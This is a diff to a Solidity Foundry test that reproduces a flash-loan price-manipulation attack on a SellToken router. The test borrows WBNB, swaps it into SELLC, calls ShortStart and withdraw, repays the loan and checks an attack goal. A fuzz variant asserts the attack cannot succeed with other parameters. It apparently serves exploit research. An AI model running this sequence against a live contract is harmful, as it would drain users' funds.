@@ -10,13 +10,11 @@ import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
 import {WBNB} from "@utils/WBNB.sol";
-import {WETH} from "@utils/WETH.sol";
 
 contract SellTokenTestBase is Test, BlockLoader {
     SellToken sellc;
     WBNB wbnb;
     USDT usdt;
-    WETH weth;
     UniswapV2Pair pair;
     UniswapV2Factory factory;
     UniswapV2Router router;
@@ -27,7 +25,6 @@ contract SellTokenTestBase is Test, BlockLoader {
     address sellcAddr;
     address wbnbAddr;
     address usdtAddr;
-    address wethAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
@@ -50,8 +47,6 @@ contract SellTokenTestBase is Test, BlockLoader {
 
     function setUp() public {
         owner = address(this);
-        weth = new WETH();
-        wethAddr = address(weth);
         wbnb = new WBNB();
         wbnbAddr = address(wbnb);
         usdt = new USDT();
@@ -76,7 +71,7 @@ contract SellTokenTestBase is Test, BlockLoader {
             address(0x0)
         );
         factoryAddr = address(factory);
-        router = new UniswapV2Router(address(factory), address(wbnb));
+        router = new UniswapV2Router(address(factory), address(0x0));
         routerAddr = address(router);
         srouter = new SellTokenRouter(
             address(wbnb),
@@ -259,45 +254,41 @@ contract SellTokenTestBase is Test, BlockLoader {
         pair.swap(amountOut, 0, attacker, new bytes(0));
     }
 
+    function deposit_srouter_wbnb_sellc(uint256 amount) internal eurus {
+        srouter.setTokenPrice(address(sellc));
+        IERC20(wbnb).transfer(address(srouter.mkt()), amount);
+        srouter.ShortStart(address(sellc), address(attacker), 1, amount);
+    }
+
+    function withdraw_srouter_sellc_wbnb(uint256 amount) internal eurus {
+        srouter.withdraw(address(sellc));
+    }
+
     function test_gt() public {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(26854757);
         borrow_wbnb_owner(428 ether);
         printBalance("After step0 ");
-        
-        swap_pair_attacker_wbnb_sellc(
-            ((wbnb.balanceOf(address(attacker)) - 10)* 99) / 100,
-             pair.getAmountOut(((wbnb.balanceOf(address(attacker)) - 10)* 99) / 100, address(wbnb))
-        );
-        printBalance("After step1 ");
-        
-        srouter.setTokenPrice(address(sellc));
-        swap_pair_attacker_sellc_wbnb(
-            sellc.balanceOf(address(attacker)),
-            pair.getAmountOut(sellc.balanceOf(address(attacker)), address(sellc))
-        );
-        printBalance("After step2 ");
-
         swap_pair_attacker_wbnb_sellc(
             (wbnb.balanceOf(address(attacker)) * 99) / 100,
-            pair.getAmountOut((wbnb.balanceOf(address(attacker)) * 99) / 100, address(wbnb))
+            5000000 ether
         );
-        printBalance("After step3 ");
-        
-        IERC20(wbnb).transfer(address(srouter.mkt()), 4 ether);
-        srouter.ShortStart(address(sellc), address(attacker), 1, 4 ether);
-        printBalance("After step4 ");
-      
+        printBalance("After step1 ");
+        deposit_srouter_wbnb_sellc(4 ether);
+        printBalance("After step2 ");
         swap_pair_attacker_sellc_wbnb(
             sellc.balanceOf(address(attacker)),
-            pair.getAmountOut(sellc.balanceOf(address(attacker)), address(sellc))
+            pair.getAmountOut(
+                sellc.balanceOf(address(attacker)),
+                address(sellc)
+            )
         );
+        printBalance("After step3 ");
+        withdraw_srouter_sellc_wbnb(0);
+        printBalance("After step4 ");
+        payback_wbnb_owner(428 ether);
         printBalance("After step5 ");
-      
-        srouter.withdraw(address(sellc));
-        printBalance("After step6 ");
-      
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
@@ -307,15 +298,21 @@ contract SellTokenTestBase is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
     ) public {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(26854757);
-        vm.assume(amt3 >= amt0);
+        vm.assume(amt7 >= amt0);
         borrow_wbnb_owner(amt0);
         swap_pair_attacker_wbnb_sellc(amt1, amt2);
-        swap_pair_attacker_sellc_wbnb(amt3, amt4);
+        deposit_srouter_wbnb_sellc(amt3);
+        swap_pair_attacker_sellc_wbnb(amt4, amt5);
+        withdraw_srouter_sellc_wbnb(amt6);
+        payback_wbnb_owner(amt7);
         assert(!attackGoal());
         vm.stopPrank();
     }
